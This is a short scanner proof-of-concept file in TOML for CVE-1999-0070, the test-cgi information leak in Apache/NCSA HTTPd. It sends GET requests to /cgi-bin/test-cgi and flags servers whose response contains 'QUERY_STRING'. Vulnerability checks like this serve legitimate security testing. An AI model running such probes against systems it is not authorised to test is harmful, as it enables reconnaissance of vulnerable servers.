[info]
author = "ave"
description = "PoC/EXP for verification"
id = "POC-AVE-1999-0175"
name = "Apache NCSA HTTPd test-cgi 目录遍历信息泄露 PoC"
severity = "medium"
tags = ["ave-1999-0175"]
vuln_id = [
    "CVE-1999-0070",
    "AVE-1999-0175",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/cgi-bin/test-cgi"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["QUERY_STRING"]

[[poc.requests]]
method = "GET"
path = "/cgi-bin/test-cgi?test=1"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["QUERY_STRING"]
